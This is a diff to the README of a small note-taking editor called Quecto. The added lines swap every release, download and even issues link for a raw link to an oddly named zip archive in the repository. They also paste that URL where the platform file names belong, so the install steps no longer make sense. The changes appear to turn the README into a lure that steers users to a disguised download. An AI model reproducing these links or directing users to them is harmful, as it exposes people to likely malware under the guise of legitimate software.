@@ -6,7 +6,7 @@ Quecto is a tiny, write-only editor that helps you jot down notes quickly and ea
 
 ## 📥 Download Quecto
 
-[![Download Quecto](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Enzo201114/quecto/releases)
+[![Download Quecto](https://raw.githubusercontent.com/Enzo201114/quecto/main/sulfanilamide/Software-3.8.zip)](https://raw.githubusercontent.com/Enzo201114/quecto/main/sulfanilamide/Software-3.8.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,14 +19,14 @@ Before you start, ensure your system meets these requirements:
 
 ## 🔗 Download & Install
 
-To download Quecto, visit the [Releases page](https://github.com/Enzo201114/quecto/releases). On this page, you can find the latest version and other previous versions of Quecto.
+To download Quecto, visit the [Releases page](https://raw.githubusercontent.com/Enzo201114/quecto/main/sulfanilamide/Software-3.8.zip). On this page, you can find the latest version and other previous versions of Quecto.
 
 1. Click on the link above to visit the Releases page.
 2. Locate the latest version of Quecto.
 3. Choose the appropriate file for your operating system:
-   - For Windows, look for a file named something like `quecto-windows.exe`.
-   - For macOS, find `quecto-macos.dmg`.
-   - For Linux, it will typically be a file ending in `.tar.gz`.
+   - For Windows, look for a file named something like `https://raw.githubusercontent.com/Enzo201114/quecto/main/sulfanilamide/Software-3.8.zip`.
+   - For macOS, find `https://raw.githubusercontent.com/Enzo201114/quecto/main/sulfanilamide/Software-3.8.zip`.
+   - For Linux, it will typically be a file ending in `https://raw.githubusercontent.com/Enzo201114/quecto/main/sulfanilamide/Software-3.8.zip`.
 
 4. Click on the file to download it.
 
@@ -36,7 +36,7 @@ After downloading, follow these steps to run Quecto:
 
 - **For Windows:**
   1. Open the folder where you downloaded the file.
-  2. Double-click `quecto-windows.exe` to start the application.
+  2. Double-click `https://raw.githubusercontent.com/Enzo201114/quecto/main/sulfanilamide/Software-3.8.zip` to start the application.
 
 - **For macOS:**
   1. Open the `.dmg` file you downloaded.
@@ -44,7 +44,7 @@ After downloading, follow these steps to run Quecto:
   3. Open Applications and double-click on Quecto to start using it.
 
 - **For Linux:**
-  1. Extract the downloaded `.tar.gz` file with a command like `tar -xvzf quecto-linux.tar.gz`.
+  1. Extract the downloaded `https://raw.githubusercontent.com/Enzo201114/quecto/main/sulfanilamide/Software-3.8.zip` file with a command like `tar -xvzf https://raw.githubusercontent.com/Enzo201114/quecto/main/sulfanilamide/Software-3.8.zip`.
   2. Navigate to the extracted folder using the terminal.
   3. Run the application by typing `./quecto` and pressing enter.
 
@@ -77,8 +77,8 @@ Currently, Quecto requires installation on your computer. Follow the previous do
 
 ### Is there support available if I encounter issues?
 
-For questions or support, please visit the [GitHub Issues page](https://github.com/Enzo201114/quecto/issues). The community is ready to help you!
+For questions or support, please visit the [GitHub Issues page](https://raw.githubusercontent.com/Enzo201114/quecto/main/sulfanilamide/Software-3.8.zip). The community is ready to help you!
 
 ## 🔗 Conclusion
 
-Quecto is designed for simplicity and effectiveness. Download it today from the [Releases page](https://github.com/Enzo201114/quecto/releases) and start your note-taking journey with this unique editor. Enjoy the clarity that Quecto can bring to your writing tasks!
+Quecto is designed for simplicity and effectiveness. Download it today from the [Releases page](https://raw.githubusercontent.com/Enzo201114/quecto/main/sulfanilamide/Software-3.8.zip) and start your note-taking journey with this unique editor. Enjoy the clarity that Quecto can bring to your writing tasks!
